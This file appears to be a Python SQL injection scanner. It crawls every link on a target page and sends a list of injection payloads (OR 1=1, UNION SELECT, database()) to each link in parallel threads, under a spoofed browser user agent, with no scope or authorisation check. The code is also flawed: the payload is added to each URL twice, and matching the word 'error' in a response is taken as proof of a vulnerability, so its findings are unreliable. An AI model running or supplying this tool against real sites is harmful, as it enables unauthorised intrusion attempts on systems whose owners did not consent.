import requests
import logging
import shutil
import threading
import sys
import os
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from inspect import currentframe

# Configurations
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
SQLI_PAYLOADS = [
    "' OR 1=1 --",
    '" OR 1=1 --',
    "' OR 'a'='a' --",
    '" OR "a"="a" --',
    "' UNION SELECT null, null, null --",
    '" UNION SELECT null, null, null --',
    "' UNION SELECT NULL, NULL, database() --",
    "' AND 1=2 UNION SELECT null, null, null --",
    # Add more complex payloads as required
]

# Setup logger
logging.basicConfig(filename="sqlscan.log", level=logging.INFO,
                    format="%(asctime)s - %(message)s")
logger = logging.getLogger()

def check_sqli(url, payload):
    """Function to check if the URL is vulnerable to SQL Injection"""
    try:
        headers = {'User-Agent': USER_AGENT}
        response = requests.get(url + payload, headers=headers, timeout=10)

        if response.status_code == 200:
            if "error" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
                logger.info(f"Potential SQLi vulnerability found at: {url} with payload: {payload}")
                return True
            else:
                return False
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed for URL: {url}, Error: {str(e)}")
    return False

def scan_url(url):
    """Function to scan a URL with multiple payloads"""
    for payload in SQLI_PAYLOADS:
        full_url = urljoin(url, payload)
        logger.info(f"Scanning URL: {full_url}")
        if check_sqli(full_url, payload):
            logger.info(f"SQLi vulnerability confirmed at {full_url} with payload: {payload}")
        else:
            logger.info(f"No vulnerability found for URL: {full_url}")

def scan_urls_in_parallel(urls, num_threads=10):
    """Function to scan URLs in parallel using threads"""
    def thread_target(url):
        scan_url(url)
    
    threads = []
    for url in urls:
        t = threading.Thread(target=thread_target, args=(url,))
        t.start()
        threads.append(t)

        # Control the number of concurrent threads
        if len(threads) >= num_threads:
            for t in threads:
                t.join()
            threads = []  # Reset threads after waiting

    # Join any remaining threads
    for t in threads:
        t.join()

def get_urls_from_page(url):
    """Function to extract all URLs from a given page using BeautifulSoup"""
    try:
        headers = {'User-Agent': USER_AGENT}
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            urls = set()
            for anchor in soup.find_all('a', href=True):
                full_url = urljoin(url, anchor['href'])
                urls.add(full_url)
            return urls
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed for URL: {url}, Error: {str(e)}")
    return set()

def main():
    if len(sys.argv) < 3:
        print("Usage: sqlscan.py -u <url>")
        sys.exit(1)

    if sys.argv[1] == "-u":
        base_url = sys.argv[2]

        if not base_url.startswith("http"):
            base_url = "http://" + base_url

        logger.info(f"Starting SQLi brute force scan for: {base_url}")

        # Get all URLs on the target site
        urls_to_scan = get_urls_from_page(base_url)
        logger.info(f"Found {len(urls_to_scan)} URLs to scan")

        # Scan URLs in parallel
        scan_urls_in_parallel(urls_to_scan)
        logger.info("SQLi scan completed.")

if __name__ == "__main__":
    main()
